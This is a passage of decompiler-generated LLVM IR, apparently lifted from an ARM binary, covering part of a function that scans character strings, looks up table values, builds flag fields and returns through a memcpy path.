  %v8_1556c = icmp sgt i32 %v2_15564, 1
  br i1 %v8_1556c, label %.thread24, label %dec_label_pc_15570

dec_label_pc_15570:                               ; preds = %dec_label_pc_1555c
  %v1_15570 = inttoptr i32 %v1_15580 to i8*
  %v2_15570 = load i8, i8* %v1_15570, align 1
  %v3_15570 = zext i8 %v2_15570 to i32
  store i32 %v3_15570, i32* %r2.global-to-local, align 4
  %v1_15574 = inttoptr i32 %v1_1557c to i8*
  %v2_15574 = load i8, i8* %v1_15574, align 1
  %v3_15574 = zext i8 %v2_15574 to i32
  store i32 %v3_15574, i32* %r3.global-to-local, align 4
  %v9_15578 = icmp eq i8 %v2_15570, %v2_15574
  br i1 %v9_15578, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_15570
  %v2_1557c = add i32 %v1_1557c, 9
  store i32 %v2_1557c, i32* %r1.global-to-local, align 4
  %v2_15580 = add i32 %v1_15580, 1
  store i32 %v2_15580, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_15570, %dec_label_pc_1555c, %bb150
  %v0_15588 = phi i32 [ %v1_1557c, %dec_label_pc_15570 ], [ %v1_1557c, %dec_label_pc_1555c ], [ %v2_1557c, %bb150 ]
  %v0_15584 = phi i32 [ %v1_15580, %dec_label_pc_15570 ], [ %v1_15580, %dec_label_pc_1555c ], [ %v2_15580, %bb150 ]
  %v1_15584 = inttoptr i32 %v0_15584 to i8*
  %v2_15584 = load i8, i8* %v1_15584, align 1
  %v3_15584 = zext i8 %v2_15584 to i32
  store i32 %v3_15584, i32* %r2.global-to-local, align 4
  %v1_15588 = add i32 %v0_15588, 9
  %v2_15588 = inttoptr i32 %v1_15588 to i8*
  %v3_15588 = load i8, i8* %v2_15588, align 1
  %v4_15588 = zext i8 %v3_15588 to i32
  store i32 %v4_15588, i32* %r3.global-to-local, align 4
  %v2_1558c = icmp eq i8 %v2_15584, 0
  %v3_15590 = mul nuw nsw i32 %v4_15588, 256
  store i32 %v3_15590, i32* @ip, align 4
  br i1 %v2_1558c, label %dec_label_pc_157f0, label %dec_label_pc_15598

dec_label_pc_15598:                               ; preds = %.thread24
  store i32 -37504, i32* %r3.global-to-local, align 4
  %v2_1559c = add i32 %v0_15538, -37504
  store i32 %v2_1559c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %dec_label_pc_15624, %dec_label_pc_15598
  %v1_155b4 = phi i32 [ %v1_15624, %dec_label_pc_15624 ], [ %v2_1559c, %dec_label_pc_15598 ]
  %v1_155a0 = inttoptr i32 %v1_155b4 to i8*
  %v2_155a0 = load i8, i8* %v1_155a0, align 1
  %v3_155a0 = zext i8 %v2_155a0 to i32
  store i32 %v3_155a0, i32* %r3.global-to-local, align 4
  %v9_155a4 = icmp eq i8 %v2_155a0, %v2_15584
  br i1 %v9_155a4, label %dec_label_pc_155ac, label %dec_label_pc_15624

dec_label_pc_155ac:                               ; preds = %dec_label_pc_155a0
  store i32 %v2_1559c, i32* %r3.global-to-local, align 4
  %v2_155b4 = sub i32 %v1_155b4, %v2_1559c
  store i32 %v2_155b4, i32* %r1.global-to-local, align 4
  %v7_155bc = icmp slt i32 %v2_155b4, 18
  br i1 %v7_155bc, label %bb152, label %dec_label_pc_155c0

dec_label_pc_155c0:                               ; preds = %dec_label_pc_155ac
  %v1_155c0 = and i32 %v3_15590, 1024
  %v2_155c0 = icmp eq i32 %v1_155c0, 0
  br i1 %v2_155c0, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_155c0
  %v2_155c4 = add i32 %v2_155b4, -2
  store i32 %v2_155c4, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_155ac, %dec_label_pc_155c0, %bb151
  %v0_155cc = phi i32 [ %v2_155b4, %dec_label_pc_155ac ], [ %v2_155b4, %dec_label_pc_155c0 ], [ %v2_155c4, %bb151 ]
  store i32 -37552, i32* %r3.global-to-local, align 4
  %v1_155cc = load i32, i32* %r7.global-to-local, align 4
  %v2_155cc = add i32 %v1_155cc, 32
  %v3_155cc = inttoptr i32 %v2_155cc to i32*
  store i32 %v0_155cc, i32* %v3_155cc, align 4
  %v0_155d0 = load i32, i32* @lr, align 4
  %v1_155d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_155d0 = add i32 %v1_155d0, %v0_155d0
  store i32 %v2_155d0, i32* %r3.global-to-local, align 4
  %v1_155d4 = add i32 %v2_155d0, -1
  store i32 %v1_155d4, i32* %r0.global-to-local, align 4
  %v0_155dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_155d8

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155d8, %bb152
  %v0_155d8 = phi i32 [ %v1_155d8, %dec_label_pc_155d8 ], [ %v1_155d4, %bb152 ]
  %v1_155d8 = add i32 %v0_155d8, 1
  %v2_155d8 = inttoptr i32 %v1_155d8 to i8*
  %v3_155d8 = load i8, i8* %v2_155d8, align 1
  %v4_155d8 = zext i8 %v3_155d8 to i32
  store i32 %v4_155d8, i32* %r3.global-to-local, align 4
  store i32 %v1_155d8, i32* %r0.global-to-local, align 4
  %v8_155e0 = icmp sgt i32 %v0_155dc.pre, %v4_155d8
  br i1 %v8_155e0, label %dec_label_pc_155d8, label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155d8
  %v2_155ec.neg = sub i32 37552, %v0_155d0
  %v2_155f0 = add i32 %v2_155ec.neg, %v1_155d8
  %v2_155f4 = mul i32 %v2_155f0, 2
  store i32 %v2_155f4, i32* %r2.global-to-local, align 4
  %v2_155f8 = add i32 %v0_155d0, -37568
  store i32 %v2_155f8, i32* %r3.global-to-local, align 4
  %v2_155fc = add i32 %v2_155f4, %v2_155f8
  %v3_155fc = inttoptr i32 %v2_155fc to i16*
  %v4_155fc = load i16, i16* %v3_155fc, align 2
  %v6_155fc = sext i16 %v4_155fc to i32
  store i32 %v6_155fc, i32* %r1.global-to-local, align 4
  %v2_15604 = add i32 %v0_155d0, -37584
  store i32 %v2_15604, i32* %r3.global-to-local, align 4
  %v2_15608 = add i32 %v2_155f4, %v2_15604
  %v3_15608 = inttoptr i32 %v2_15608 to i16*
  %v4_15608 = load i16, i16* %v3_15608, align 2
  %v6_15608 = sext i16 %v4_15608 to i32
  %v1_1560c = load i32, i32* @ip, align 4
  %v2_1560c = or i32 %v1_1560c, %v6_155fc
  %v2_15610 = and i32 %v2_1560c, %v6_15608
  store i32 %v2_15610, i32* %r1.global-to-local, align 4
  store i32 -37504, i32* %r3.global-to-local, align 4
  %v2_15618 = add i32 %v0_155d0, -37504
  store i32 %v2_15618, i32* %r0.global-to-local, align 4
  store i32 %v2_15610, i32* %stack_var_-72, align 4
  %v0_1563c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15630

dec_label_pc_15624:                               ; preds = %dec_label_pc_155a0
  %v1_15624 = add i32 %v1_155b4, 1
  %v2_15624 = inttoptr i32 %v1_15624 to i8*
  %v3_15624 = load i8, i8* %v2_15624, align 1
  %v4_15624 = zext i8 %v3_15624 to i32
  store i32 %v4_15624, i32* %r3.global-to-local, align 4
  store i32 %v1_15624, i32* %r0.global-to-local, align 4
  %v2_15628 = icmp eq i8 %v3_15624, 0
  br i1 %v2_15628, label %dec_label_pc_15630, label %dec_label_pc_155a0

dec_label_pc_15630:                               ; preds = %dec_label_pc_15624, %dec_label_pc_155e4
  %v0_1563c = phi i32 [ %v0_1563c.pre, %dec_label_pc_155e4 ], [ %v0_15584, %dec_label_pc_15624 ]
  %v0_15638 = phi i32 [ %v1_1560c, %dec_label_pc_155e4 ], [ %v3_15590, %dec_label_pc_15624 ]
  %v0_15630 = load i32, i32* @r4, align 4
  %v1_15630 = and i32 %v0_15630, 4
  %v1_15634 = and i32 %v0_15630, -5
  store i32 %v1_15634, i32* %r3.global-to-local, align 4
  %v1_15638 = and i32 %v0_15638, 3840
  store i32 %v1_15638, i32* %r2.global-to-local, align 4
  %v1_1563c = inttoptr i32 %v0_1563c to i8*
  %v2_1563c = load i8, i8* %v1_1563c, align 1
  %v3_1563c = zext i8 %v2_1563c to i32
  store i32 %v3_1563c, i32* %r1.global-to-local, align 4
  %v2_15640 = or i32 %v1_15634, %v1_15638
  store i32 %v2_15640, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_15630, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_1564c = load i32, i32* %r7.global-to-local, align 4
  %v2_1564c = add i32 %v1_1564c, 20
  %v3_1564c = inttoptr i32 %v2_1564c to i32*
  store i32 %tmp181, i32* %v3_1564c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_15654 = load i32, i32* %r1.global-to-local, align 4
  %v1_15654 = load i32, i32* %r7.global-to-local, align 4
  %v2_15654 = add i32 %v1_15654, 12
  %v3_15654 = inttoptr i32 %v2_15654 to i32*
  store i32 %v0_15654, i32* %v3_15654, align 4
  %v0_15658 = load i32, i32* %r7.global-to-local, align 4
  %v1_15658 = add i32 %v0_15658, 4
  %v2_15658 = inttoptr i32 %v1_15658 to i32*
  %v3_15658 = load i32, i32* @r5, align 4
  store i32 %v3_15658, i32* %v2_15658, align 4
  %v4_15658 = add i32 %v0_15658, 8
  %v5_15658 = inttoptr i32 %v4_15658 to i32*
  %v6_15658 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_15658, i32* %v5_15658, align 4
  %v0_1565c = load i32, i32* %r2.global-to-local, align 4
  %v1_1565c = load i32, i32* %r7.global-to-local, align 4
  %v2_1565c = add i32 %v1_1565c, 16
  %v3_1565c = inttoptr i32 %v2_1565c to i32*
  store i32 %v0_1565c, i32* %v3_1565c, align 4
  %v0_15660 = load i32, i32* %r3.global-to-local, align 4
  %v1_15660 = load i32, i32* %r7.global-to-local, align 4
  %v2_15660 = add i32 %v1_15660, 28
  %v3_15660 = inttoptr i32 %v2_15660 to i32*
  store i32 %v0_15660, i32* %v3_15660, align 4
  %v0_15664 = load i32, i32* %r0.global-to-local, align 4
  %v1_15664 = inttoptr i32 %v0_15664 to i8*
  %v2_15664 = load i8, i8* %v1_15664, align 1
  %v3_15664 = zext i8 %v2_15664 to i32
  store i32 %v3_15664, i32* %r2.global-to-local, align 4
  %v2_15668 = icmp eq i8 %v2_15664, 0
  br i1 %v2_15668, label %dec_label_pc_15670, label %dec_label_pc_156f4

dec_label_pc_15670:                               ; preds = %dec_label_pc_15630
  %v0_15670 = load i32, i32* %r6.global-to-local, align 4
  %v1_15670 = inttoptr i32 %v0_15670 to i8*
  %v2_15670 = load i8, i8* %v1_15670, align 1
  %v3_15670 = zext i8 %v2_15670 to i32
  store i32 %v3_15670, i32* %r3.global-to-local, align 4
  %v7_15674 = icmp eq i8 %v2_15670, 109
  br i1 %v7_15674, label %.thread28, label %dec_label_pc_15688

.thread28:                                        ; preds = %dec_label_pc_15670
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_1567c = load i32, i32* %r7.global-to-local, align 4
  %v3_1567c = add i32 %v2_1567c, 32
  %v4_1567c = inttoptr i32 %v3_1567c to i32*
  store i32 20, i32* %v4_1567c, align 4
  %v1_15680 = load i32, i32* %r2.global-to-local, align 4
  %v2_15680 = load i32, i32* %r7.global-to-local, align 4
  %v3_15680 = add i32 %v2_15680, 28
  %v4_15680 = inttoptr i32 %v3_15680 to i32*
  store i32 %v1_15680, i32* %v4_15680, align 4
  br label %dec_label_pc_156f4

dec_label_pc_15688:                               ; preds = %dec_label_pc_15670
  store i32 908, i32* %r3.global-to-local, align 4
  %v0_1568c = load i32, i32* @lr, align 4
  %v2_1568c = add i32 %v0_1568c, 908
  %v3_1568c = inttoptr i32 %v2_1568c to i32*
  %v4_1568c = load i32, i32* %v3_1568c, align 4
  store i32 %v4_1568c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_15694 = load i32, i32* %r7.global-to-local, align 4
  %v2_15694 = add i32 %v1_15694, 32
  %v3_15694 = inttoptr i32 %v2_15694 to i32*
  store i32 21, i32* %v3_15694, align 4
  %v0_15698 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15698, i32* @ip, align 4
  %v1_1569c = add i32 %v0_15698, 10
  store i32 %v1_1569c, i32* %r0.global-to-local, align 4
  %v0_156a4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_156a4 = inttoptr i32 %v0_156a4.pre to i8*
  br label %dec_label_pc_156a0

dec_label_pc_156a0:                               ; preds = %dec_label_pc_156e4, %dec_label_pc_15688
  %v1_156b0 = phi i32 [ %v1_156e4, %dec_label_pc_156e4 ], [ %v0_15698, %dec_label_pc_15688 ]
  %v1_156a0 = inttoptr i32 %v1_156b0 to i8*
  %v2_156a0 = load i8, i8* %v1_156a0, align 1
  %v3_156a0 = zext i8 %v2_156a0 to i32
  store i32 %v3_156a0, i32* %r2.global-to-local, align 4
  %v2_156a4 = load i8, i8* %v1_156a4, align 1
  %v3_156a4 = zext i8 %v2_156a4 to i32
  store i32 %v3_156a4, i32* %r3.global-to-local, align 4
  %v9_156a8 = icmp eq i8 %v2_156a0, %v2_156a4
  br i1 %v9_156a8, label %dec_label_pc_156b0, label %dec_label_pc_156e4

dec_label_pc_156b0:                               ; preds = %dec_label_pc_156a0
  %v2_156b0 = sub i32 %v1_156b0, %v0_15698
  store i32 %v2_156b0, i32* %r3.global-to-local, align 4
  %v0_156b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_156b8 = add i32 %v0_156b8, 4
  store i32 %v1_156b8, i32* %r0.global-to-local, align 4
  %v0_156bc = load i32, i32* @lr, align 4
  %v2_156bc = add i32 %v0_156bc, 26408
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_156c4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_156c4, i32* %r2.global-to-local, align 4
  %v4_156c8 = mul i32 %v2_156b0, 4
  %v5_156c8 = add i32 %v2_156bc, %v4_156c8
  %v6_156c8 = inttoptr i32 %v5_156c8 to i32*
  %v7_156c8 = load i32, i32* %v6_156c8, align 4
  store i32 %v7_156c8, i32* @ip, align 4
  store i32 87764, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_156c8)
  %v0_156d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_156d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_156d8 = add i32 %v1_156d8, 28
  %v3_156d8 = inttoptr i32 %v2_156d8 to i32*
  store i32 %v0_156d4, i32* %v3_156d8, align 4
  %v7_156dc = icmp sgt i32 %v0_156d4, 5
  br i1 %v7_156dc, label %dec_label_pc_157f0, label %dec_label_pc_156f4

dec_label_pc_156e4:                               ; preds = %dec_label_pc_156a0
  %v1_156e4 = add i32 %v1_156b0, 1
  store i32 %v1_156e4, i32* %r1.global-to-local, align 4
  %v3_156e8 = icmp ult i32 %v1_156e4, %v1_1569c
  br i1 %v3_156e8, label %dec_label_pc_156a0, label %dec_label_pc_157f0

dec_label_pc_156f4:                               ; preds = %.thread28, %dec_label_pc_156b0, %dec_label_pc_15630
  %v0_156f4 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_156f4, 1
  br i1 %tmp156, label %dec_label_pc_157a0, label %dec_label_pc_156fc

dec_label_pc_156fc:                               ; preds = %dec_label_pc_156f4
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_15714 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_15700

dec_label_pc_15700:                               ; preds = %dec_label_pc_15788, %dec_label_pc_156fc
  %v9_15720 = phi i32 [ 0, %dec_label_pc_156fc ], [ %v1_1578c, %dec_label_pc_15788 ]
  %v7_15704 = icmp sgt i32 %v9_15720, 2
  br i1 %v7_15704, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_15700
  store i32 %v9_15714, i32* %r3.global-to-local, align 4
  %v10_15720 = add i32 %v9_15720, %v9_15714
  store i32 %v10_15720, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_15700
  store i32 %v3_1537c.pre-phi, i32* @ip, align 4
  %v12_15708 = mul i32 %v9_15720, 4
  %v13_15708 = add i32 %v12_15708, %v3_1537c.pre-phi
  store i32 %v13_15708, i32* %r3.global-to-local, align 4
  %v9_15710 = add i32 %v13_15708, -12
  %v10_15710 = inttoptr i32 %v9_15710 to i8*
  %v11_15710 = load i8, i8* %v10_15710, align 4
  %v12_15710 = zext i8 %v11_15710 to i32
  store i32 %v12_15710, i32* %r2.global-to-local, align 4
  %v9_15718 = load i32, i32* %r7.global-to-local, align 4
  %v10_15718 = add i32 %v9_15718, %v9_15720
  store i32 %v10_15718, i32* %r3.global-to-local, align 4
  store i32 %v12_15710, i32* %r1.global-to-local, align 4
  %v11_15724 = add i32 %v10_15718, 36
  %v12_15724 = inttoptr i32 %v11_15724 to i8*
  store i8 %v11_15710, i8* %v12_15724, align 1
  %v0_15728.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_15748 = phi i32 [ %v10_15720, %.thread38 ], [ %v0_15728.pre, %bb157 ]
  %v1_15728 = load i32, i32* %fp.global-to-local, align 4
  %v2_15728 = sub i32 %v0_15748, %v1_15728
  %v4_15728 = xor i32 %v1_15728, %v0_15748
  %v5_15728 = xor i32 %v2_15728, %v0_15748
  %v6_15728 = and i32 %v5_15728, %v4_15728
  %v7_15728 = icmp slt i32 %v6_15728, 0
  %v8_15728 = icmp slt i32 %v2_15728, 0
  %v9_15728 = icmp eq i32 %v0_15748, %v1_15728
  %v3_1572c = xor i1 %v8_15728, %v7_15728
  %v4_1572c = or i1 %v9_15728, %v3_1572c
  br i1 %v4_1572c, label %dec_label_pc_1573c, label %dec_label_pc_15730

dec_label_pc_15730:                               ; preds = %bb158
  %v1_15730 = add i32 %v0_15748, -9
  %v3_15730 = sub i32 8, %v0_15748
  %v4_15730 = and i32 %v3_15730, %v0_15748
  %v5_15730 = icmp slt i32 %v4_15730, 0
  %v6_15730 = icmp slt i32 %v1_15730, 0
  %v7_15730 = icmp eq i32 %v0_15748, 9
  %v3_15734 = xor i1 %v6_15730, %v5_15730
  %v4_15734 = or i1 %v7_15730, %v3_15734
  br i1 %v4_15734, label %dec_label_pc_15738, label %dec_label_pc_157f0

dec_label_pc_15738:                               ; preds = %dec_label_pc_15730
  store i32 %v0_15748, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1573c

dec_label_pc_1573c:                               ; preds = %bb158, %dec_label_pc_15738
  store i32 %v3_1537c.pre-phi, i32* @r2, align 4
  %v1_15740 = load i32, i32* %r8.global-to-local, align 4
  %v4_15740 = mul i32 %v1_15740, 4
  %v5_15740 = add i32 %v4_15740, %v3_1537c.pre-phi
  store i32 %v5_15740, i32* %sb.global-to-local, align 4
  %v1_15744 = add i32 %v5_15740, -40
  %v2_15744 = inttoptr i32 %v1_15744 to i32*
  %v3_15744 = load i32, i32* %v2_15744, align 4
  store i32 %v3_15744, i32* %r5.global-to-local, align 4
  %v1_15748 = add i32 %v0_15748, -1
  store i32 %v1_15748, i32* %r3.global-to-local, align 4
  %v0_1574c = load i32, i32* %r7.global-to-local, align 4
  %v4_1574c = mul i32 %v1_15748, 4
  %v5_1574c = add i32 %v0_1574c, %v4_1574c
  store i32 %v5_1574c, i32* %sl.global-to-local, align 4
  %v7_15750 = icmp eq i32 %v3_15744, 8
  %v1_15754 = add i32 %v5_1574c, 40
  %v2_15754 = inttoptr i32 %v1_15754 to i32*
  %v3_15754 = load i32, i32* %v2_15754, align 4
  store i32 %v3_15754, i32* @r0, align 4
  br i1 %v7_15750, label %dec_label_pc_15788, label %dec_label_pc_1575c

dec_label_pc_1575c:                               ; preds = %dec_label_pc_1573c
  %v9_1575c = icmp eq i32 %v3_15754, %v3_15744
  br i1 %v9_1575c, label %dec_label_pc_15780, label %bb159

bb159:                                            ; preds = %dec_label_pc_1575c
  %v8_15760 = icmp eq i32 %v3_15754, 8
  br i1 %v8_15760, label %dec_label_pc_15780, label %dec_label_pc_15768

dec_label_pc_15768:                               ; preds = %bb159
  %v0_15768 = call i32 @_promoted_size()
  %v0_15770 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15770, i32* @r0, align 4
  %v0_15774 = call i32 @_promoted_size()
  store i32 %v0_15774, i32* %r0.global-to-local, align 4
  %v8_1577c = icmp sgt i32 %v0_15768, %v0_15774
  br i1 %v8_1577c, label %dec_label_pc_15788, label %dec_label_pc_15768.dec_label_pc_15780_crit_edge

dec_label_pc_15768.dec_label_pc_15780_crit_edge:  ; preds = %dec_label_pc_15768
  %v0_15780.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_15784.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15780

dec_label_pc_15780:                               ; preds = %dec_label_pc_15768.dec_label_pc_15780_crit_edge, %dec_label_pc_1575c, %bb159
  %v1_15784 = phi i32 [ %v1_15784.pre, %dec_label_pc_15768.dec_label_pc_15780_crit_edge ], [ %v5_1574c, %dec_label_pc_1575c ], [ %v5_1574c, %bb159 ]
  %v0_15780 = phi i32 [ %v0_15780.pre, %dec_label_pc_15768.dec_label_pc_15780_crit_edge ], [ %v5_15740, %dec_label_pc_1575c ], [ %v5_15740, %bb159 ]
  %v1_15780 = add i32 %v0_15780, -40
  %v2_15780 = inttoptr i32 %v1_15780 to i32*
  %v3_15780 = load i32, i32* %v2_15780, align 4
  store i32 %v3_15780, i32* %r3.global-to-local, align 4
  %v2_15784 = add i32 %v1_15784, 40
  %v3_15784 = inttoptr i32 %v2_15784 to i32*
  store i32 %v3_15780, i32* %v3_15784, align 4
  br label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %dec_label_pc_15768, %dec_label_pc_1573c, %dec_label_pc_15780
  %v0_15788 = load i32, i32* %r7.global-to-local, align 4
  %v1_15788 = add i32 %v0_15788, 28
  %v2_15788 = inttoptr i32 %v1_15788 to i32*
  %v3_15788 = load i32, i32* %v2_15788, align 4
  %v0_1578c = load i32, i32* %r8.global-to-local, align 4
  %v1_1578c = add i32 %v0_1578c, 1
  store i32 %v1_1578c, i32* %r8.global-to-local, align 4
  %v1_15790 = add i32 %v3_15788, 2
  store i32 %v1_15790, i32* %r3.global-to-local, align 4
  %v6_15798 = icmp slt i32 %v1_1578c, %v1_15790
  br i1 %v6_15798, label %dec_label_pc_15700, label %dec_label_pc_157bc

dec_label_pc_157a0:                               ; preds = %dec_label_pc_156f4
  %v0_157a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_157a0 = add i32 %v0_157a0, 28
  %v2_157a0 = inttoptr i32 %v1_157a0 to i32*
  %v3_157a0 = load i32, i32* %v2_157a0, align 4
  store i32 %v3_157a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_157a8 = add i32 %v0_157a0, 38
  %v4_157a8 = inttoptr i32 %v3_157a8 to i8*
  store i8 1, i8* %v4_157a8, align 1
  %v0_157ac = load i32, i32* %r2.global-to-local, align 4
  %v3_157ac = mul i32 %v0_157ac, 4
  store i32 %v3_157ac, i32* @r2, align 4
  %v0_157b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_157b0 = add i32 %v0_157b0, 40
  store i32 %v1_157b0, i32* @r0, align 4
  %v2_157b4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_157b4, i32* @r1, align 4
  %v0_157b8 = call i32 @memcpy()
  store i32 %v0_157b8, i32* %r0.global-to-local, align 4
  %v0_157bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_157bc

dec_label_pc_157bc:                               ; preds = %dec_label_pc_15788, %dec_label_pc_157a0
  %v2_157d8 = phi i32 [ %v0_157bc.pre, %dec_label_pc_157a0 ], [ %v0_15788, %dec_label_pc_15788 ]
  %v1_157bc = add i32 %v2_157d8, 16
  %v2_157bc = inttoptr i32 %v1_157bc to i32*
  %v3_157bc = load i32, i32* %v2_157bc, align 4
  store i32 %v3_157bc, i32* %r3.global-to-local, align 4
  %v1_157c0 = and i32 %v3_157bc, 128
  %v2_157c0 = icmp eq i32 %v1_157c0, 0
  br i1 %v2_157c0, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_157bc
  %v3_157c4 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_157c4, i32* %r3.global-to-local, align 4
  %v2_157c8 = inttoptr i32 %v2_157d8 to i32*
  %v3_157c8 = load i32, i32* %v2_157c8, align 4
  %v2_157d0.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_157d0 = sub i32 %v2_157d0.pre, %v3_157c4
  store i32 %v3_157d0, i32* %r3.global-to-local, align 4
  %v5_157d4 = mul i32 %v3_157d0, 4
  %v6_157d4 = add i32 %v5_157d4, %v3_157c8
  store i32 %v6_157d4, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_157bc
  %v1_157cc45 = load i32, i32* %r6.global-to-local, align 4
  %v2_157cc46 = add i32 %v1_157cc45, 1
  store i32 %v2_157cc46, i32* %r3.global-to-local, align 4
  %v3_157d8 = inttoptr i32 %v2_157d8 to i32*
  store i32 %v2_157cc46, i32* %v3_157d8, align 4
  %v0_157dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_157e4 = phi i32 [ %v2_157d8, %.thread48 ], [ %v0_157dc.pre, %.thread50 ]
  %v1_157dc = add i32 %v1_157e4, 28
  %v2_157dc = inttoptr i32 %v1_157dc to i32*
  %v3_157dc = load i32, i32* %v2_157dc, align 4
  store i32 %v3_157dc, i32* %r3.global-to-local, align 4
  %v1_157e0 = add i32 %v3_157dc, 2
  store i32 %v1_157e0, i32* %r0.global-to-local, align 4
  %v0_157e4 = load i32, i32* %fp.global-to-local, align 4
  %v2_157e4 = add i32 %v1_157e4, 24
  %v3_157e4 = inttoptr i32 %v2_157e4 to i32*
  store i32 %v0_157e4, i32* %v3_157e4, align 4
  br i1 %v2_157c0, label %dec_label_pc_157f4, label %bb161

bb161:                                            ; preds = %bb160
  %v1_157e8 = load i32, i32* @r2, align 4
  %v2_157e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_157e8 = inttoptr i32 %v2_157e8 to i32*
  store i32 %v1_157e8, i32* %v3_157e8, align 4
  br label %dec_label_pc_157f4

dec_label_pc_157f0:                               ; preds = %dec_label_pc_156e4, %dec_label_pc_15304, %dec_label_pc_1544c, %dec_label_pc_154f8, %dec_label_pc_154d0, %dec_label_pc_154dc, %dec_label_pc_15418, %dec_label_pc_15730, %dec_label_pc_156b0, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_157f4

dec_label_pc_157f4:                               ; preds = %bb161, %bb160, %dec_label_pc_157f0
  %v2_157f8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_157f8, i32* @r4, align 4
  store i32 %v6_152c0, i32* @r5, align 4
  store i32 %v27_152c0, i32* @lr, align 4
  %v1_157fc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_157fc

; uselistorder directives
  uselistorder i32 %v3_157d0, { 1, 0 }
  uselistorder i32 %v1_1578c, { 1, 2, 0 }
  uselistorder i32 %v2_15728, { 1, 0 }
  uselistorder i32 %v1_15728, { 1, 0, 2 }
  uselistorder i32 %v0_15748, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_15720, { 0, 2, 1, 3 }
  uselistorder i32 %v1_156e4, { 1, 2, 0 }
  uselistorder i32 %v0_156d4, { 1, 0 }
  uselistorder i32 %v1_156b0, { 1, 0, 2 }
  uselistorder i32 %v1_15624, { 1, 2, 0 }
  uselistorder i32 %v1_1560c, { 1, 0 }
  uselistorder i32 %v2_155f4, { 2, 1, 0 }
  uselistorder i32 %v1_155d8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_155d0, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_155b4, { 1, 0, 2 }
  uselistorder i32 %v2_1559c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_15590, { 2, 1, 0 }
  uselistorder i32 %v1_15550, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15540.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1551c, { 1, 0 }
  uselistorder i32 %v5_1547c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1547c, { 1, 0 }
  uselistorder i32 %v0_1548076, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_15424, { 1, 0 }
  uselistorder i32 %v0_15444, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_15408, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_153f0, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_153e0, { 1, 0 }
  uselistorder i32 %v3_153d8, { 0, 2, 1 }
  uselistorder i8 %v2_153d8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15458, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_1539c, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15388, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15370, { 1, 0 }
  uselistorder i32 %v3_1537c.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_15324, { 0, 2, 1 }
  uselistorder i32 %v2_15310, { 1, 0, 2 }
  uselistorder i32 %v0_152c4, { 0, 1, 3, 2, 4 }
